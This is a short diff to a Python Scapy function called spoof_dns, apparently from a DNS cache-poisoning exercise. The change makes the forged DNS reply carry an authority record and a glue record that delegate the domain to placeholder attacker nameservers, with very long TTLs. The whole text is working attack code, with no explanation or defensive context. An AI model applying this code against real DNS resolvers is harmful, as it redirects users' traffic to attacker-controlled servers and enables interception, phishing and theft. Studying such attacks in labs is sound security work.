@@ -17,7 +17,7 @@ def spoof_dns(pkt):
         Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', rdata='1.2.3.5', ttl=999999) 
         Nssec = DNSRR(rrname=NS_NAME, type='NS', rdata=ATTACKER_NAMESERVER, ttl=999999)
         Assec = DNSRR(rrname=ATTACKER_NAMESERVER, type='A', rdata=ATTACKER_NAMESERVER_IP, ttl=999999)
-        dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, an=Anssec) 
+        dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, an=Anssec, ns=Nssec, ar=Assec) 
         spoofpkt = ip/udp/dns 
         send(spoofpkt)
 
